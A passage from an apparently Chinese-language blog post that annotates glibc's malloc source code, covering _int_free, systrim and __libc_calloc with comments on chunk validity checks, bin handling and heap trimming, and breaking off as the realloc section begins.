class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> _int_free (mstate av, mchunkptr p, <span class="hljs-type">int</span> have_lock) &#123;<br>  INTERNAL_SIZE_T size;        <span class="hljs-comment">/* 释放的chunk的size */</span><br>  mfastbinptr *fb;             <span class="hljs-comment">/* 对应的fastbin */</span><br>  mchunkptr nextchunk;         <span class="hljs-comment">/* 内存空间中下一个chunk */</span><br>  INTERNAL_SIZE_T nextsize;    <span class="hljs-comment">/* 下一个chunk的大小 */</span><br>  <span class="hljs-type">int</span> nextinuse;               <span class="hljs-comment">/* 下一个chunk是否在使用 */</span><br>  INTERNAL_SIZE_T prevsize;    <span class="hljs-comment">/* 内存空间中上一个chunk */</span><br>  mchunkptr bck;               <span class="hljs-comment">/* 用于储存bin链表指针 */</span><br>  mchunkptr fwd;               <span class="hljs-comment">/* 用于储存bin链表指针 */</span><br> <br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *errstr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> locked = <span class="hljs-number">0</span>;<br>  size = chunksize (p);<br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>) || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>)) &#123;<br>    <span class="hljs-comment">//chunk的指针地址不能溢出</span><br>    errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>  errout:<br>    <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>      (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>    malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>    <span class="hljs-keyword">return</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size))) &#123;<br>    <span class="hljs-comment">//chunk的大小必须大于等于MINSIZE且对齐</span><br>    errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br>  check_inuse_chunk(av, p);<br>  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  ) &#123;<br>    <span class="hljs-comment">//当前free的chunk属于fastbin</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect (chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>      <span class="hljs-comment">//查看下一个相邻的chunk的大小是否小于等于2 * SIZE_SZ,或是否大于分配区所分配的内存总量</span><br>        <span class="hljs-keyword">if</span> (have_lock || (&#123; assert (locked == <span class="hljs-number">0</span>); mutex_lock(&amp;av-&gt;mutex); locked = <span class="hljs-number">1</span>; chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem; &#125;)) &#123;<br>          errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>          (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>          locked = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//读取分配区所分配的内存总量需要对分配区加锁,检查完以后,释放分配区的锁</span><br>    &#125;<br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br> <br>    set_fastchunks(av);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br>    <span class="hljs-comment">//设置当前分配区的fastbin的flag,表示当前分配区的fastbin中已有空闲chunk.然后根据当前free的chunk大小获取所属的fastbin</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-comment">//fastbin double free检测</span><br>          errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>          old_idx = fastbin_index(chunksize(old));<br>        p-&gt;fd = old2 = old;<br>    &#125; <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br>    <span class="hljs-comment">//使用lock-free技术实现fastbin的单向链表插入操作</span><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>)) &#123;<br>        errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!chunk_is_mmapped(p)) &#123;<br>    <span class="hljs-comment">//当前free的chunk不是通过mmap分配的,并且当前还没有获得分配区的锁,获取分配区的锁</span><br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      (<span class="hljs-type">void</span>)mutex_lock(&amp;av-&gt;mutex);<br>      locked = <span class="hljs-number">1</span>;<br>    &#125;<br>    nextchunk = chunk_at_offset(p, size);<br> <br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (p == av-&gt;top)) &#123;<br>      <span class="hljs-comment">//free的是top chunk</span><br>        errstr = <span class="hljs-string">&quot;double free or corruption (top)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (__builtin_expect (contiguous (av) &amp;&amp; (<span class="hljs-type">char</span> *) nextchunk &gt;= ((<span class="hljs-type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="hljs-number">0</span>)) &#123;<br>      <span class="hljs-comment">//内存中下一个chunk的地址大于top chunk的末尾</span><br>        errstr = <span class="hljs-string">&quot;double free or corruption (out)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk))) &#123;<br>      <span class="hljs-comment">//该chunk已经是free状态</span><br>        errstr = <span class="hljs-string">&quot;double free or corruption (!prev)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br> <br>    nextsize = chunksize(nextchunk);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>) || __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>)) &#123;<br>      <span class="hljs-comment">//查看下一个相邻的chunk的大小是否小于等于2 * SIZE_SZ,或是否大于分配区所分配的内存总量</span><br>        errstr = <span class="hljs-string">&quot;free(): invalid next size (normal)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br> <br>    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>      <span class="hljs-comment">//如果当前free的chunk的前一个相邻chunk为空闲状态,与前一个空闲chunk合并</span><br>      prevsize = p-&gt;prev_size;<br>      size += prevsize;<br>      p = chunk_at_offset(p, -((<span class="hljs-type">long</span>) prevsize));<br>      unlink(av, p, bck, fwd);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123;<br>      <span class="hljs-comment">//与当前free的chunk相邻的下一个chunk不是分配区的top chunk</span><br>      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br>      <span class="hljs-keyword">if</span> (!nextinuse) &#123;<br>        <span class="hljs-comment">//如果当前free的chunk的下一个相邻chunk为空闲状态,与下一个空闲chunk合并</span><br>          unlink(av, nextchunk, bck, fwd);<br>          size += nextsize;<br>      &#125; <span class="hljs-keyword">else</span><br>        <span class="hljs-comment">//与当前free的chunk相邻的下一个chunk处于inuse状态,清除当前chunk的inuse状态</span><br>          clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br> <br>      bck = unsorted_chunks(av);<br>      fwd = bck-&gt;fd;<br>      <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck)) &#123;<br>        <span class="hljs-comment">//unsorted_bin第一个chunk的fd的bk不是第一个chunk</span><br>          errstr = <span class="hljs-string">&quot;free(): corrupted unsorted chunks&quot;</span>;<br>          <span class="hljs-keyword">goto</span> errout;<br>        &#125;<br>      p-&gt;fd = fwd;<br>      p-&gt;bk = bck;<br>      <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>          p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>          p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>      bck-&gt;fd = p;<br>      fwd-&gt;bk = p;<br>      <span class="hljs-comment">//将合并后的chunk加入unsorted_bin的双向循环链表中</span><br>      set_head(p, size | PREV_INUSE);<br>      set_foot(p, size);<br>      check_free_chunk(av, p);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">//当前free的chunk下一个相邻的chunk为top chunk,则将当前chunk合并入top chunk</span><br>      size += nextsize;<br>      set_head(p, size | PREV_INUSE);<br>      av-&gt;top = p;<br>      check_chunk(av, p);<br>    &#125;<br> <br>    <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD) &#123;<br>      <span class="hljs-comment">//如果合并后的chunk大小大于64KB</span><br>      <span class="hljs-keyword">if</span> (have_fastchunks(av))<br>          malloc_consolidate(av);<br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena) &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> MORECORE_CANNOT_TRIM</span><br>          <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(chunksize(av-&gt;top)) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(mp_.trim_threshold))<br>          <span class="hljs-comment">//如果当前分配区为主分配区且top chunk的大小大于heap的收缩阈值,调用systrim函数收缩heap</span><br>            systrim(mp_.top_pad, av);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">//为非主分配区,调用heap_trim函数收缩非主分配区的sub_heap</span><br>          heap_info *heap = heap_for_ptr(top(av));<br>          assert(heap-&gt;ar_ptr == av);<br>          heap_trim(heap, mp_.top_pad);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (! have_lock) &#123;<br>      <span class="hljs-comment">//有锁则对分配区解锁</span><br>      assert (locked);<br>      (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//当前free的chunk是通过mmap分配则调用munma_chunk释放</span><br>    munmap_chunk (p);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a><code>systrim</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">systrim</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> pad, mstate av)</span> &#123;<br>  <span class="hljs-type">long</span> top_size;<br>  <span class="hljs-type">long</span> extra;<br>  <span class="hljs-type">long</span> released;<br>  <span class="hljs-type">char</span> *current_brk;<br>  <span class="hljs-type">char</span> *new_brk;<br>  <span class="hljs-type">size_t</span> pagesize;<br>  <span class="hljs-type">long</span> top_area;<br> <br>  pagesize = GLRO (dl_pagesize);<br>  top_size = chunksize (av-&gt;top);<br>  top_area = top_size - MINSIZE - <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> (top_area &lt;= pad)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  extra = ALIGN_DOWN(top_area - pad, pagesize);<br>  <span class="hljs-comment">//计算top chunk中最大可释放的整数页大小,top chunk中至少需要MINSIZE的内存保存fencepost</span><br>  <span class="hljs-keyword">if</span> (extra == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>  current_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>  <span class="hljs-keyword">if</span> (current_brk == (<span class="hljs-type">char</span> *) (av-&gt;top) + top_size) &#123;<br>    <span class="hljs-comment">//如果当前top chunk的结束地址与当前的brk值相等,执行heap收缩</span><br>    MORECORE (-extra);<br>    <span class="hljs-comment">//调用sbrk释放指定大小的内存</span><br>    <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span>) = atomic_forced_read (__after_morecore_hook);<br>    <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>      (*hook)();<br>    new_brk = (<span class="hljs-type">char</span> *) (MORECORE (<span class="hljs-number">0</span>));<br>    LIBC_PROBE (memory_sbrk_less, <span class="hljs-number">2</span>, new_brk, extra);<br>    <span class="hljs-keyword">if</span> (new_brk != (<span class="hljs-type">char</span> *) MORECORE_FAILURE) &#123;<br>      <span class="hljs-comment">//计算释放的内存大小,更新当前分配区所分配的内存总量,更新top chunk的大小</span><br>      released = (<span class="hljs-type">long</span>) (current_brk - new_brk);<br>      <span class="hljs-keyword">if</span> (released != <span class="hljs-number">0</span>) &#123;<br>        av-&gt;system_mem -= released;<br>        set_head (av-&gt;top, (top_size - released) | PREV_INUSE);<br>        check_malloc_state (av);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="calloc源码分析"><a href="#calloc源码分析" class="headerlink" title="calloc源码分析"></a>calloc源码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<br>__libc_calloc (<span class="hljs-type">size_t</span> n, <span class="hljs-type">size_t</span> elem_size)<br>&#123;<br>  mstate av;<br>  mchunkptr oldtop, p;<br>  INTERNAL_SIZE_T bytes, sz, csz, oldtopsize;<br>  <span class="hljs-type">void</span> *mem;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clearsize;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> nclears;<br>  INTERNAL_SIZE_T *d;<br> <br>  <span class="hljs-comment">/* size_t is unsigned so the behavior on overflow is defined.  */</span><br>  <span class="hljs-comment">// 将需要申请的内存大小转换为以字节为单位</span><br>  bytes = n * elem_size;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HALF_INTERNAL_SIZE_T \</span><br><span class="hljs-meta">  (((INTERNAL_SIZE_T) 1) &lt;&lt; (8 * sizeof (INTERNAL_SIZE_T) / 2))</span><br><br>  <span class="hljs-comment">// 如果 n 和 elem_size 中的任何一个不小于 HALF_INTERNAL_SIZE_T</span><br>  <span class="hljs-comment">// 以 64 位为例，HALF_INTERNAL_SIZE_T = 2^32</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((n | elem_size) &gt;= HALF_INTERNAL_SIZE_T, <span class="hljs-number">0</span>))<br>    &#123;<br>      <span class="hljs-comment">// 判断 bytes 是否溢出</span><br>      <span class="hljs-keyword">if</span> (elem_size != <span class="hljs-number">0</span> &amp;&amp; bytes / elem_size != n)<br>        &#123;<br>          __set_errno (ENOMEM);<br>          <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>  <br>  <span class="hljs-comment">// 获取 __malloc_hook</span><br>  <span class="hljs-type">void</span> *(*hook) (<span class="hljs-type">size_t</span>, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *) =<br>    atomic_forced_read (__malloc_hook);<br>  <br>  <span class="hljs-comment">// 如果 __malloc_hook 不为 NULL 则调用 __malloc_hook，参数为申请内存的大小。</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      sz = bytes;<br>      mem = (*hook)(sz, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>      <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (mem, <span class="hljs-number">0</span>, sz);<br>    &#125;<br> <br>  sz = bytes;<br> <br>  arena_get (av, sz);<br>  <span class="hljs-keyword">if</span> (av)<br>    &#123;<br>      <span class="hljs-comment">/* Check if we hand out the top chunk, in which case there may be no</span><br><span class="hljs-comment">     need to clear. */</span><br>   <span class="hljs-comment">// 获取 top chunk 和 top chunk 的大小，这里的 top chunk 的大小是指 top chunk 头之后可以“控制”的的内存大小，具体看后面的解释。</span><br>   <span class="hljs-comment">// 获取这些的原因是无论是 main_arena 控制的 heap 区域通过 sbrk 扩展还是非 main_arena 区域通过对 heap_info 向后扩展受保护的内存区域，</span><br>   <span class="hljs-comment">// 新扩展的内存初始值为 0，即这些内存不需要清空，因此后面会将需要清零的内存大小减去和这部分内存重合的区域，提升程序效率。</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CLEARS</span><br>      oldtop = top (av);<br>      oldtopsize = chunksize (top (av));<br><span class="hljs-meta"># <span class="hljs-keyword">if</span> MORECORE_CLEARS &lt; 2</span><br>      <span class="hljs-comment">/* Only newly allocated memory is guaranteed to be cleared.  */</span><br>      <span class="hljs-keyword">if</span> (av == &amp;main_arena &amp;&amp;<br>      oldtopsize &lt; mp_.sbrk_base + av-&gt;max_system_mem - (<span class="hljs-type">char</span> *) oldtop)<br>  <span class="hljs-comment">// 对于 main_arena 管理的内存，top chunk 后需要清空的内存大小为 top chunk 到原先 heap 区域末尾位置</span><br>    oldtopsize = (mp_.sbrk_base + av-&gt;max_system_mem - (<span class="hljs-type">char</span> *) oldtop);<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br>      <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>    &#123;<br>    <span class="hljs-comment">// 对于非 main_arena 管理的内存，top chunk 后需要清空的内存大小为 top chunk 到原先 heap_info 受保护区域末尾位置</span><br>      heap_info *heap = heap_for_ptr (oldtop);<br>      <span class="hljs-keyword">if</span> (oldtopsize &lt; (<span class="hljs-type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="hljs-type">char</span> *) oldtop)<br>        oldtopsize = (<span class="hljs-type">char</span> *) heap + heap-&gt;mprotect_size - (<span class="hljs-type">char</span> *) oldtop;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-comment">/* No usable arenas.  */</span><br>      <span class="hljs-comment">// av 为 NULL ，那么之后 _int_malloc 会直接 mmap 获取内存，而 mmap 获取的内存初始值为 0，因此不需要清零。</span><br>      oldtop = <span class="hljs-number">0</span>;<br>      oldtopsize = <span class="hljs-number">0</span>;<br>    &#125;<br>  <span class="hljs-comment">// 调用 _int_malloc 获取内存</span><br>  mem = _int_malloc (av, sz);<br> <br>  <span class="hljs-comment">// 同 __libc_malloc 的 3 种情况</span><br>  assert (!mem || chunk_is_mmapped (mem2chunk (mem)) ||<br>          av == arena_for_chunk (mem2chunk (mem)));<br> <br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span> &amp;&amp; av != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      LIBC_PROBE (memory_calloc_retry, <span class="hljs-number">1</span>, sz);<br>      av = arena_get_retry (av, sz);<br>      mem = _int_malloc (av, sz);<br>    &#125;<br> <br>  <span class="hljs-keyword">if</span> (av != <span class="hljs-literal">NULL</span>)<br>    (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br> <br>  <span class="hljs-comment">/* Allocation failed even after a retry.  */</span><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br> <br>  p = mem2chunk (mem);<br> <br>  <span class="hljs-comment">/* Two optional cases in which clearing not necessary */</span><br>  <span class="hljs-comment">// 如果是 mmap 获取的不需要清零，因此只要 chunk 的 size 字段中的 IS_MMAPPED 位置 1 就不会清零。</span><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (__builtin_expect (perturb_byte, <span class="hljs-number">0</span>))<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (mem, <span class="hljs-number">0</span>, sz);<br> <br>      <span class="hljs-keyword">return</span> mem;<br>    &#125;<br> <br>  csz = chunksize (p);<br> <br><span class="hljs-meta">#<span class="hljs-keyword">if</span> MORECORE_CLEARS</span><br>  <span class="hljs-comment">// 如果是从 top chunk 上切下来的则只需要清零 top chunk 范围的内存。</span><br>  <span class="hljs-keyword">if</span> (perturb_byte == <span class="hljs-number">0</span> &amp;&amp; (p == oldtop &amp;&amp; csz &gt; oldtopsize))<br>    &#123;<br>      <span class="hljs-comment">/* clear only the bytes from non-freshly-sbrked memory */</span><br>      csz = oldtopsize;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br> <br>  <span class="hljs-comment">/* Unroll clear of &lt;= 36 bytes (72 if 8byte sizes).  We know that</span><br><span class="hljs-comment">     contents have an odd number of INTERNAL_SIZE_T-sized words;</span><br><span class="hljs-comment">     minimally 3.  */</span><br>  <span class="hljs-comment">// 清空内存，包括下一个 chunk 的 prev_size 。   </span><br>  d = (INTERNAL_SIZE_T *) mem;<br>  clearsize = csz - SIZE_SZ;<br>  nclears = clearsize / <span class="hljs-keyword">sizeof</span> (INTERNAL_SIZE_T);<br>  assert (nclears &gt;= <span class="hljs-number">3</span>);<br>   <br>  <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">9</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">memset</span> (d, <span class="hljs-number">0</span>, clearsize);<br> <br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      *(d + <span class="hljs-number">0</span>) = <span class="hljs-number">0</span>;<br>      *(d + <span class="hljs-number">1</span>) = <span class="hljs-number">0</span>;<br>      *(d + <span class="hljs-number">2</span>) = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">4</span>)<br>        &#123;<br>          *(d + <span class="hljs-number">3</span>) = <span class="hljs-number">0</span>;<br>          *(d + <span class="hljs-number">4</span>) = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">6</span>)<br>            &#123;<br>              *(d + <span class="hljs-number">5</span>) = <span class="hljs-number">0</span>;<br>              *(d + <span class="hljs-number">6</span>) = <span class="hljs-number">0</span>;<br>              <span class="hljs-keyword">if</span> (nclears &gt; <span class="hljs-number">8</span>)<br>                &#123;<br>                  *(d + <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;<br>                  *(d + <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br> <br>  <span class="hljs-keyword">return</span> mem;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="relloc源码分析"><a href="#relloc源码分析" class="headerlink" title="relloc源码分析"></a>relloc源码分析</h2><h3 id="libc-realloc"><a href="#libc-realloc" class="headerlink" title="_libc_realloc"></a><code>_libc_realloc</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 